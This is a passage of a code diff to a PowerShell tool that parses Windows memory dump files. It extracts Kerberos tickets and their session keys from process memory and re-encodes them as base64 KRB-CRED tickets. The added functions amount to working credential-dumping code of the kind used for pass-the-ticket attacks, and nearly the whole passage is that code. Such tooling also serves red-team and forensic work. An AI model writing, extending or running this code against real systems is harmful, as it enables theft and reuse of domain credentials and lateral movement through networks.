+        $PRealm =     Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+        $PPrincipalname =          Add-DERTag -Tag 0xA2 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                    )
+                )
+            )
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        #Convert-ByteArrayToHex $PRealm
+
+        $EncServiceNames = $null
+        foreach($ServiceData in $ServiceName.Names.Data )
+            {
+             $EncServiceNames += (Add-DERUtf8String($ServiceData))
+            }
+
+
+        $SPrincipalname = Add-DERTag -Tag 0xA9 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+            )
+        #Convert-ByteArrayToHex $SPrincipalname 
+
+        $TicketInfo = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                            Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+
+                Add-DERTag -Tag 0xA2 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xA3 -Data @(Add-DERBitString -Data (Convert-HexToByteArray ("00" + $TicketFlags)))
+                #Add-DERTag -Tag 0xA4 -Data @(Add-DERDate -Date $startTime.value)
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($endTime.value))) # Generalized time: EndTime
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($RenewUntil.value))) # Generalized time: RenewTill
+                Add-DERTag -Tag 0xA8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+                Add-DERTag -Tag 0xA9 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(
+                              $EncServiceNames
+                             )
+                            )
+                        )
+                    )
+                )
+
+        $ENCKRBCredPart =  Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0))
+                Add-DERTAG -Tag 0xA2 (Add-DEROctetString (Add-DERTag -Tag 0x7D -Data @( (Add-DERSequence -Data @((Add-DERTag -Tag 0xA0 -data (Add-DERSequence -Data @( $TicketInfo)))) ))))
+                )
+
+        # Ticket
+        $krb5_pvno = 5
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        $NAME_TYPE_SRV_INST = 02 
+
+        $TSName = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($NAME_TYPE_SRV_INST))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+        $ETicket = Add-DERSequence -Data @(
+               Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+               Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($TicketKvno))
+               Add-DERTag -Tag 0xA2 -Data @(Add-DEROctetString (Convert-HexToByteArray $Ticket.Data))   
+               )
+
+        # Final Ticket
+        $TicketFull = Add-DERTag -Tag 0x61 -Data @( Add-DERSequence -Data @(
+                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($krb5_pvno))
+                    Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $DomainName.Data)
+                    Add-DERTag -Tag 0xA2 -Data @( $TSName)
+                    Add-DERTag -Tag 0xA3 -Data @($ETicket )
+                    ))
+        $pvno = 05
+        $MSG_KRB_CRED = 22
+       
+        $TheTicket =  Add-DERTag -Tag 0x76 -Data @(
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($pvno))
+            Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($MSG_KRB_CRED))
+            Add-DERTAG -Tag 0xA2 (Add-DERSequence -Data @($TicketFull)) 
+            Add-DERTAG -Tag 0xA3 ($ENCKRBCredPart)   
+        ))
+
+        $TicketB64 = ([System.Convert]::ToBase64String($TheTicket)) 
 
         $Kerberos_internal_ticket = New-Object -Type psobject -Property (@{
 		    "Flink" = $Flink
@@ -5163,6 +5573,8 @@ $Start = Get-Date
 		    "TicketEncType" = $TicketEncType
 		    "TicketKvno" = $TicketKvno
 		    "Ticket" = $Ticket
+            "TicketType" = $Type
+            "TicketB64" = $TicketB64 
             })
         return $Kerberos_internal_ticket
         }
@@ -5339,7 +5751,7 @@ $Start = Get-Date
                         "finaltype" = ""
                         })
 
-        $TicketFlags = ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         
         $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
         
@@ -5425,7 +5837,126 @@ $Start = Get-Date
                         })
         $Ticket.data = (Get-MemoryAddress -MemoryAddress $Ticket.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Ticket.Length).trim(),16)) -PathToDMP $PathToDMP).Data
 
+         $EncryptionKey =          Add-DERTag -Tag 0xA0 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($KeyType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                    Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                    )
+                )
+            )
 
+        $PRealm =     Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+        $PPrincipalname =          Add-DERTag -Tag 0xA2 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                    )
+                )
+            )
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        #Convert-ByteArrayToHex $PRealm
+
+        $EncServiceNames = $null
+        foreach($ServiceData in $ServiceName.Names.Data )
+            {
+             $EncServiceNames += (Add-DERUtf8String($ServiceData))
+            }
+
+
+        $SPrincipalname = Add-DERTag -Tag 0xA9 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+            )
+        #Convert-ByteArrayToHex $SPrincipalname 
+
+        $TicketInfo = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                            Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+
+                Add-DERTag -Tag 0xA2 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xA3 -Data @(Add-DERBitString -Data (Convert-HexToByteArray ("00" + $TicketFlags)))
+                #Add-DERTag -Tag 0xA4 -Data @(Add-DERDate -Date $startTime.value)
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($endTime.value))) # Generalized time: EndTime
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($RenewUntil.value))) # Generalized time: RenewTill
+                Add-DERTag -Tag 0xA8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+                Add-DERTag -Tag 0xA9 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(
+                              $EncServiceNames
+                             )
+                            )
+                        )
+                    )
+                )
+
+        $ENCKRBCredPart =  Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0))
+                Add-DERTAG -Tag 0xA2 (Add-DEROctetString (Add-DERTag -Tag 0x7D -Data @( (Add-DERSequence -Data @((Add-DERTag -Tag 0xA0 -data (Add-DERSequence -Data @( $TicketInfo)))) ))))
+                )
+
+        # Ticket
+        $krb5_pvno = 5
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        $NAME_TYPE_SRV_INST = 02 
+
+        $TSName = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($NAME_TYPE_SRV_INST))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+        $ETicket = Add-DERSequence -Data @(
+               Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+               Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($TicketKvno))
+               Add-DERTag -Tag 0xA2 -Data @(Add-DEROctetString (Convert-HexToByteArray $Ticket.Data))   
+               )
+
+        # Final Ticket
+        $TicketFull = Add-DERTag -Tag 0x61 -Data @( Add-DERSequence -Data @(
+                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($krb5_pvno))
+                    Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $DomainName.Data)
+                    Add-DERTag -Tag 0xA2 -Data @( $TSName)
+                    Add-DERTag -Tag 0xA3 -Data @($ETicket )
+                    ))
+        $pvno = 05
+        $MSG_KRB_CRED = 22
+       
+        $TheTicket =  Add-DERTag -Tag 0x76 -Data @(
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($pvno))
+            Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($MSG_KRB_CRED))
+            Add-DERTAG -Tag 0xA2 (Add-DERSequence -Data @($TicketFull)) 
+            Add-DERTAG -Tag 0xA3 ($ENCKRBCredPart)   
+        ))
+
+        $TicketB64 = ([System.Convert]::ToBase64String($TheTicket)) 
 
         $Kerberos_internal_ticket = New-Object -Type psobject -Property (@{
 		    "Flink" = $Flink
@@ -5463,9 +5994,440 @@ $Start = Get-Date
 		    "TicketEncType" = $TicketEncType
 		    "TicketKvno" = $TicketKvno
 		    "Ticket" = $Ticket
+            "TicketType" = $Type
+            "TicketB64" = $TicketB64 
             })
         return $Kerberos_internal_ticket
         }
+
+    function Get-Kerberos_Internal_Ticket_11
+        {
+        param(
+            $PathToDMP,
+            $Dump,
+            $StartPosition
+        )
+        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+        $fileReader.BaseStream.Position=(Get-MemoryAddress -MemoryAddress  $StartPosition -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position
+
+        $DomainName = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $TargetDomainName = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $Description = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $AltTargetDomainName = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $KDCServer = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $unk10586d = New-Object -Type psobject -Property (@{
+            "Position" = $null
+            "Length" = $null
+            "MaxLength" = $null
+            "Buffer" = $null
+            "Data" = $null
+            })
+
+        $Key = New-Object -Type psobject -Property (@{
+            "length" = $Null
+            "Value" = $Null
+            "Data" = $Null
+            })
+
+
+        $Ticket = New-Object -Type psobject -Property (@{
+            "length" = $Null
+            "Value" = $Null
+            "Data" = $Null
+            })
+
+        $Flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+		$Blink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+		$unk0 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+		$unk1 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+
+        $ServiceName = Get-PKERB_External_Name -Dump $Dump -PathToDmp $PathToDMP -MemoryAddress (Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-',''))
+
+        $Targetname = Get-PKERB_External_Name -Dump $Dump -PathToDmp $PathToDMP -MemoryAddress (Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-',''))
+
+        $DomainName.Position = $fileReader.BaseStream.Position
+        $DomainName.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $DomainName.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $DomainName.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $DomainName.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $DomainName.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($DomainName.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+        
+        $TargetDomainName.Position = $fileReader.BaseStream.Position
+        $TargetDomainName.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $TargetDomainName.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $TargetDomainName.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $TargetDomainName.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $TargetDomainName.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($TargetDomainName.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+        
+
+        $Description.Position = $fileReader.BaseStream.Position
+        $Description.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $Description.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $Description.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        if($Description.Buffer -ne "0000000000000000")
+            {
+            $Description.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $Description.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Description.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+            }
+        else
+            {
+            $Description.Data =  ""
+            }
+
+
+        $AltTargetDomainName.Position = $fileReader.BaseStream.Position
+        $AltTargetDomainName.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $AltTargetDomainName.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $AltTargetDomainName.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        if($AltTargetDomainName.Buffer -ne "0000000000000000")
+            {
+            $AltTargetDomainName.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $AltTargetDomainName.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($AltTargetDomainName.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+            }
+        else
+            {
+            $AltTargetDomainName.Data =  ""
+            }
+
+
+        $KDCServer.Position = $fileReader.BaseStream.Position
+        $KDCServer.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $KDCServer.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $KDCServer.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        if($KDCServer.Buffer -ne "0000000000000000")
+            {
+            $KDCServer.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $KDCServer.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($KDCServer.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+            }
+        else
+            {
+            $KDCServer.Data =  ""
+            }
+
+
+        $unk10586d.Position = $fileReader.BaseStream.Position
+        $unk10586d.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $unk10586d.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $unk10586d.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        if($unk10586d.Buffer -ne "0000000000000000")
+            {
+            $unk10586d.Data =  Get-CharsFromHex -HexString (Get-MemoryAddress -MemoryAddress $unk10586d.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($unk10586d.MaxLength).trim(),16)) -PathToDMP $PathToDMP).Data
+            }
+        else
+            {
+            $unk10586d.Data =  ""
+            }
+
+        $Clientname = Get-PKERB_External_Name -Dump $Dump -PathToDmp $PathToDMP -MemoryAddress (Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-',''))
+
+		$name0 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+
+        $TicketFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        
+        $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        
+        $unk143930 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })     
+        #Neu        self.unk2x = ULONG(reader).value
+        $unk2x = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $KeyType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        
+        $Key.length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $Key.value = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+        $Key.data = (Get-MemoryAddress -MemoryAddress $Key.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Key.Length).trim(),16)) -PathToDMP $PathToDMP).Data
+
+        $unk143931 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+
+        $unk3 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+        $unk4 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+        $unk5 = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+
+        $StartTime = New-Object -Type psobject -Property (@{
+                        "dwLowDateTime" = ($dwLowDateTime = [convert]::touint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "dwHighDateTime" = ($dwHighDateTime = [convert]::touint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "value" = ($dwHighDateTime -shl 32) + $dwLowDateTime
+                        })
+        $EndTime = New-Object -Type psobject -Property (@{
+                        "dwLowDateTime" = ($dwLowDateTime = [convert]::toint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "dwHighDateTime" = ($dwHighDateTime = [convert]::toint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "value" = ($dwHighDateTime -shl 32) + $dwLowDateTime
+                        })
+        $RenewUntil = New-Object -Type psobject -Property (@{
+                        "dwLowDateTime" = ($dwLowDateTime = [convert]::toint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "dwHighDateTime" = ($dwHighDateTime = [convert]::toint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')).trim(),16))
+                        "value" = ($dwHighDateTime -shl 32) + $dwLowDateTime
+                        })
+
+        $unk6 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $unk7 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $domain = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $unk8 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        
+        $StrangeNames = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+        $unk9 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketEncType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $TicketKvno = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+
+        $Ticket.length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
+        $Ticket.value = New-Object -Type psobject -Property (@{
+                        "Location" = $fileReader.BaseStream.Position
+                        "value" = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+                        "finaltype" = ""
+                        })
+        $Ticket.data = (Get-MemoryAddress -MemoryAddress $Ticket.value.value -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64(($Ticket.Length).trim(),16)) -PathToDMP $PathToDMP).Data
+
+
+
+
+        $EncryptionKey =          Add-DERTag -Tag 0xA0 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($KeyType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                    Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                    )
+                )
+            )
+
+        $PRealm =     Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+        $PPrincipalname =          Add-DERTag -Tag 0xA2 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                    )
+                )
+            )
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        #Convert-ByteArrayToHex $PRealm
+
+        $EncServiceNames = $null
+        foreach($ServiceData in $ServiceName.Names.Data )
+            {
+             $EncServiceNames += (Add-DERUtf8String($ServiceData))
+            }
+
+
+        $SPrincipalname = Add-DERTag -Tag 0xA9 -Data @(
+            Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+            )
+        #Convert-ByteArrayToHex $SPrincipalname 
+
+        $TicketInfo = Add-DERSequence -Data @(
